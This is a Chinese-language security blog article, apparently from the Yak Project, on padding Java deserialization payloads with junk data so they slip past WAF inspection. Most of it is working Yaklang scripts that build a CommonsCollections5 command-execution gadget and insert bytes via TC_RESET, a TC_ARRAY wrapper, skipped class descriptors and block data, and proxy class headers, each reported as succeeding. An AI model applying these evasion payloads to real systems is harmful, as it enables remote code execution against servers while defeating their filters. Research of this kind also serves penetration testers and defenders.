#  Java 脏数据填充探索   
Z3r0ne  Yak Project   2024-03-22 17:30  
  
![](/articles/wechat2md-57d4b38fb5fac67b077017855ed50c43.gif)  
  
![](/articles/wechat2md-69ccb1a450342e9d14a3d91bc01e943c.png)  
  
  
# **前言**  
  
有师傅提出了 Yso JavaHack 的生成序列化payload需要填充脏数据的需求，由于yak引擎没有java环境，所以不能直接对gadget封装，只能对数据化流操作，记录下分析过程。  
  
# **什么是脏数据**  
  
什么是脏数据，为什么需要填充脏数据？先说脏数据的作用是绕过WAF的检查，那WAF是如何检查payload的？  
  
可能是查aced头，可能是查关键字符串，或其它特征信息。再说一些waf可能存在的难点：如果请求体过大，可能会分段传输，需要对tcp报文重组，再解析为http请求后分析。如果重组后的包过大，可能由于性能问题放弃分析，或者由于数据太多，等待超时没有收到完整tcp报文放弃分析，这时可能只会对前几个报文进行特征匹配，利用此特点可以进行绕过。  
  
如果是查aced头这种无差别拦截，那payload就没什么变形法子了，但如果查关键词，主要也就是一些gadget常用的类名，那可以想办法在不影响序列化流解析的前提下，在类名前塞一些数据，将实际生效的payload放在后面，绕过WAF检查。  
  
  
# **寻找slot**  
  
  
Java序列化数据是一种格式化数据，不能无脑插入脏数据，需要找到一种合法方式在不影响序列化流正常解析的情况下塞脏数据。  
  
从开发角度思考，可能存在塞脏数据的点可能有：  
1. 循环读数据流，跳过一些无意义、占位的数据或坏的数据块，如：  
  
```
do{
    b = reader.ReadByte()
}while(b == 0x00)
```   
2. 递归解析数据流，前面可以塞任意数据，只要最后一次反序列化成功就ok,例如  
  
```
func readObject(stream) {
    flag = stream.readByte()
    ....
    readObject(stream)
}
```   
  
读一下ObjectInputStream的流程，重点看一下可能塞脏数据的逻辑，发现了几个可利用的位置。  
  
  
# **Append脏数据**  
  
  
反序列化是从流中读取数据，当解析出一个完整对象就会结束反序列化流程。所以最简单暴力的方法就是直接append脏数据，但缺点是只能加到payload后，如果WAF只查前几个TCP报文，还是会被查。  
  
  
# **TC_RESET**  
   
  
在readObject0方法中看到这样一段代码  
```
byte tc;
while ((tc = bin.peekByte()) == TC_RESET) {
    bin.readByte();
    handleReset();
}
```  
这段代码可以理解为忽略所有TC_RESET，并调用handleReset，handleReset的作用是清空handle表，在序列化刚开始时清空handle表是没有影响的。这段代码运行在readObject0的开头，所以可以理解为忽略序列化数据前的所有TC_RESET  
  
使用yak编写一段脚本验证猜想，成功弹出计算器。  
```
serIns = yso.GetCommonsCollections5JavaObject("open /System/Applications/Calculator.app")~
payload = yso.ToBytes(serIns)~
dirtyData = ""
for range 100{
    dirtyData += "\x79"
}
res = string(payload[:4]) + dirtyData+ string(payload[4:])

println(codec.EncodeBase64(res))
```  
  
# **TC_ARRAY**  
  
  
readObject0的执行流程是先读对象类型，再根据类型采取不同的处理方式，如类型为ARRAY使用readArray处理。readArray的执行流程是，读classDesc，读长度，创建数组，根据数组长度，循环readObject读取数组元素。  
  
所以只要在payload前加一个array头就可以随便塞垃圾数据了，再将gadget作为最后一个元素，所以最终的payload类似这种：[]Object{null,null,null,........,gadget}  
  
在构造payload前需要准备一下：  
1. 构造classDesc  
  
用java代码生成一个序列化的Object[]对象:  
> rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwcA==  
  
编写yaklang脚本读取其中的classDesc  
```
objArrayIns = yso.GetJavaObjectFromBytes(codec.DecodeBase64("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwcA==")~)~  
descSer = yso.ToBytes(objArrayIns.JavaSerializable.ClassDesc)~
```    
2. 数组长度  
  
这是java源码：  
```
public final int readInt() throws IOException {
    int ch1 = in.read();
    int ch2 = in.read();
    int ch3 = in.read();
    int ch4 = in.read();
    if ((ch1 | ch2 | ch3 | ch4) < 0)
        throw new EOFException();
    return ((ch1 << 24) + (ch2 << 16) + (ch3 << 8) + (ch4 << 0));
}
```  
  
数组长度是一个int，占4个字节，使用大端存储，测试时可以暂时使用b"\x00\x00\x00\x02"。  
  
编写脚本：  
```
objArrayIns = yso.GetJavaObjectFromBytes(codec.DecodeBase64("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwcA==")~)~
descSer = yso.ToBytes(objArrayIns.JavaSerializable.ClassDesc)~

serIns = yso.GetCommonsCollections5JavaObject("open /System/Applications/Calculator.app")~
payload = yso.ToBytes(serIns)~
dirtyData = ""
dirtyData += "\x75"// TC_ARRAY
dirtyData += string(descSer[4:]) // 去掉magic header
dirtyData += "\x00\x00\x00\x02" // 数组长度是2
res = string(payload[:4]) + dirtyData+ string(payload[4:])
println(codec.EncodeBase64(res))
```  
  
在验证payload时发现报错：  
  
Exception in thread "main" java.lang.ClassCastException: java.io.ObjectStreamClass cannot be cast to java.lang.String  
  
出现错误的位置在读取REFERENCE处，对读取到的handle强转为String出错。  
```
case TC_REFERENCE:
    return (String) readHandle(false);
```  
  
怀疑是因为加了classdesc导致handle table错乱了，断点调试下发现本应取到6号元素，但取到了5号元素。  
  
![](/articles/wechat2md-3aa5535ba156cacaaac74083bd0b3b6b.png)  
  
在前面介绍TC_RESET时提到过，TC_RESET作用是清空handle table，所以可以在gadget前加一个TC_RESET  
  
但又出错了，因为handleReset验证了层数，也就是gadget必须在第一层：  
```
private void handleReset() throws StreamCorruptedException {
    if (depth > 0) {
        throw new StreamCorruptedException(
            "unexpected reset; recursion depth: " + depth);
    }
    clear();
}
```  
  
通过查找clear函数，发现在readFatalException时先调用了clear，再readObject0，刚好符合条件。所以可以在Gadget前加一个TC_EXCEPTION，将Gadget作为Exception解析，在解析前会清空handle table，最后脚本如下，成功弹计算器。  
```
objArrayIns = yso.GetJavaObjectFromBytes(codec.DecodeBase64("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwcA==")~)~
descSer = yso.ToBytes(objArrayIns.JavaSerializable.ClassDesc)~

serIns = yso.GetCommonsCollections5JavaObject("open /System/Applications/Calculator.app")~
payload = yso.ToBytes(serIns)~
dirtyData = ""
dirtyData += "\x75"// TC_ARRAY
dirtyData += string(descSer[4:]) // 去掉magic header
dirtyData += "\x00\x00\x00\x02" // 数组长度是2
dirtyData += "\x7B"
res = string(payload[:4]) + dirtyData+ string(payload[4:])
println(codec.EncodeBase64(res))
```  
  
但缺点是解析的对象会强转为IOException并抛出，控制台不太好看。  
  
  
## **skipCustomData**  
  
在readNonProxyDesc时先解析了classDesc，再调用了skipCustomData方法，skipCustomData方法中调用了readObject0，思路和前面分析的 "递归解析数据流" 相同。也就是说，可以在gadget前随便塞classDesc，不影响gadget解析。  
  
编写一段脚本验证，发现还是解析handle出错，和构造TC_ARRAY时的情况类似，加了个TC_EXCEPTION标记后成功弹计算器  
```
objArraySer = codec.DecodeBase64("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwcA==")~
objArrayIns = yso.GetJavaObjectFromBytes(objArraySer)~
descSer = yso.ToBytes(objArrayIns.JavaSerializable.ClassDesc)~

serIns = yso.GetCommonsCollections5JavaObject("open /System/Applications/Calculator.app")~
payload = yso.ToBytes(serIns)~

dirtyData = ""
dirtyData += string(descSer[4:-2]) // 去掉magic header、super class和bolck end
dirtyData += string(descSer[4:-2]) // 塞两个试试
dirtyData += "\x7b"
res = string(payload[:4]) + dirtyData+ string(payload[4:])
println(codec.EncodeBase64(res))
```  
  
上面脚本中需要注意的是classDesc在dump出来后，最后一个字符是class的父类，这里是TC_NULL，倒数第二个字符是块结束符，这里是TC_ENDBLOCKDATA，需要去掉。  
  
在解析classDesc的代码中还可以看到，如果未从jvm找到对应的class，会抛出ClassNotFoundException异常并被捕获，在完成对象解析后才会抛出。  
  
所以classDesc的类名字段等信息都是可以随便写的，这里在类名中塞脏数据试一下，如下把类名设为长度为10000的随机字符串，也可以成功。  
```
objArraySer = codec.DecodeBase64("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwcA==")~
objArrayIns = yso.GetJavaObjectFromBytes(objArraySer)~
objArrayIns.JavaSerializable.ClassDesc.Detail.ClassName=str.RandStr(10000)
descSer = yso.ToBytes(objArrayIns.JavaSerializable.ClassDesc)~

serIns = yso.GetCommonsCollections5JavaObject("open /System/Applications/Calculator.app")~
payload = yso.ToBytes(serIns)~

dirtyData = ""
dirtyData += string(descSer[4:-2])
dirtyData += "\x7b"
res = string(payload[:4]) + dirtyData+ string(payload[4:])
println(codec.EncodeBase64(res))
```  
再看skipCustomData函数除了readObject0，还循环调用了skipBlockData，明显是用来跳过数据块的，所以猜测可以在原本gadget的classDesc后加几个数据块，在反序列化时会自动跳过，完全不影响正常解析，但可能gadget第一层的class被WAF标记，所以还是要在gadget前加一个classDesc。  
  
再写个脚本测试下：   
```
objArraySer = codec.DecodeBase64("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwcA==")~
objArrayIns = yso.GetJavaObjectFromBytes(objArraySer)~
descSer = yso.ToBytes(objArrayIns.JavaSerializable.ClassDesc)~

serIns = yso.GetCommonsCollections5JavaObject("open /System/Applications/Calculator.app")~
payload = yso.ToBytes(serIns)~

dirtyData = ""
dirtyData += string(descSer[4:-2]) // 掐magic header，去end block data和super class的尾
dirtyData += "\x77"  // TC_BLOCKDATA
dirtyData += "\x05" // 数据块大小
dirtyData += string([]byte{1,2,3,4,5}) // 脏数据
dirtyData += "\x7b"
res = string(payload[:5]) + dirtyData+ string(payload[4:])

println(codec.EncodeBase64(res))
``` 
  
# **TC_PROXYCASSDESC**  
  
在解析proxyClassDesc时会先解析代理头，再继续解析class。所以可以给gadget加个代理头,而代理头可以无限塞接口名。   
```
serIns = yso.GetCommonsCollections5JavaObject("open /System/Applications/Calculator.app")~
payload = yso.ToBytes(serIns)~

newPayload = ""
newPayload += string(payload[:5]) // aced 和 TC_OBJECT
newPayload += string("\x7d")
newPayload += string("\x00\x00\x00\x01") // 1个interface
newPayload += string("\x00\x02") // 长度是2
newPayload += "aa" // 一个接口名叫aa(会查找aa class)
newPayload += "\x7b"
newPayload += string(payload[4:]) // classData

println(codec.EncodeBase64(newPayload))
```  
  
# **总结**    
  
TC_RESET是最简单的，适合临时测试时手工加，而且对解析流程影响不大，但大量的TC_RESET在aced流中特征挺明显的。  
  
handle table错乱的问题可以暂时用\x7b解决，但会抛出异常。除此外也可以把所有引用值重新生成，或将所有的引用都改为实例来解决。当然如果是用java自动生成的序列化流就不会有这问题。  
  
Java更新迭代了这么多版本，为了兼容性，不可避免的做一些兼容处理，除了上述的方式应该还有很多办法，但贵不在多，目前觉得比较好用的是外面包一层TC_ARRAY，生成的payload是标准序列化流，兼容性最好，后面会在Yso JavaHack中采用这种方式塞脏数据。  
  
## **参考：**    
  
https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ  
  
https://y4tacker.github.io/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%95WAF%E6%96%B0%E5%A7%BF%E5%8A%BF%E7%9A%84%E8%A1%A5%E5%85%85/  
  
  
**END**  
  
  
  
 **YAK官方资源**  
  
  
Yak 语言官方教程：  
https://yaklang.com/docs/intro/Yakit   
视频教程：  
https://space.bilibili.com/437503777Github  
下载地址：  
https://github.com/yaklang/yakitYakit  
官网下载地址：  
https://yaklang.com/Yakit  
安装文档：  
https://yaklang.com/products/download_and_install  
Yakit使用文档：  
https://yaklang.com/products/intro/  
常见问题速查：  
https://yaklang.com/products/FAQ  
  
![](/articles/wechat2md-85062b6e6c63b9d9d17d1e2a5ca2ec01.other)  
长按识别添加工作人员
开启Yakit进阶之旅  
![](/articles/wechat2md-14665f86963c7c123b43378ebc55bb0f.other)